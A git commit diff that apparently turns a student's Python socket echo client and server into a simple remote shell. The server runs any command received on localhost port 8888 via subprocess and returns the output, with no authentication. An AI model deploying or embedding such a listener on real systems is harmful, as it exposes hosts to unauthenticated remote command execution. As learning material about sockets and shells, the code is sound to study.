1bf8339919c351748a6f869478a97dd29eea513e
pieterbork <pieter.bork@colorado.edu>
2018-10-17 00:19:45 -0600

    actually reverse shell now

--- python/client.py
+++ python/client.py
@@ -2,24 +2,22 @@ import socket
 import sys
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 servaddr = ('localhost', 8888)
-
 sock.connect(servaddr)
 
-try:
-    msg = "hello, sir."
-    print "sending %s" % msg
-    sock.sendall(msg)
-    
-    while True:
-        data = sock.recv(16)
+while True:
+    try:
+        msg = input('command: ').encode()
+        print("sending %s" % msg)
+        sock.sendall(msg)
+        
+        data = sock.recv(1024)
         if data:
-            print "received %s" % data
+            print("received %s" % data)
         else:
-            print "no mas!"
-            break
+            print("no response!")
+    except:
+        sock.close()
+        break
 
-finally:
-    sock.close()
         
--- python/server.py
+++ python/server.py
@@ -1,29 +1,36 @@
+import subprocess
 import socket
 import sys
-import subprocess
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 servaddr = ('localhost', 8888)
-
 sock.bind(servaddr)
-
 sock.listen(1)
 
 while True:
-    print "Waiting for connection"
+    print("Waiting for connection")
     connection, cliaddr = sock.accept()
     try:
-        print "Connection accepted"
+        print("Connection accepted")
         while True:
-            data = connection.recv(16)
+            data = connection.recv(1024).decode()
             if data:
-                print "replying 'hello!'"
-                connection.sendall('hello')
+                print("received {}".format(data))
+                try:
+                    result = subprocess.check_output(data.split())
+                except Exception as e:
+                    result = "There was an exception: {}".format(e).encode()
+                try:
+                    print(result)
+                    connection.sendall(result)
+                except:
+                    print("Error trying to send!")
             else:
-                print "no mas data, bye!"
+                print("no mas data, bye!")
                 break
-
-    finally:
+    except:
         connection.close()
+        sock.close()
+        break
 
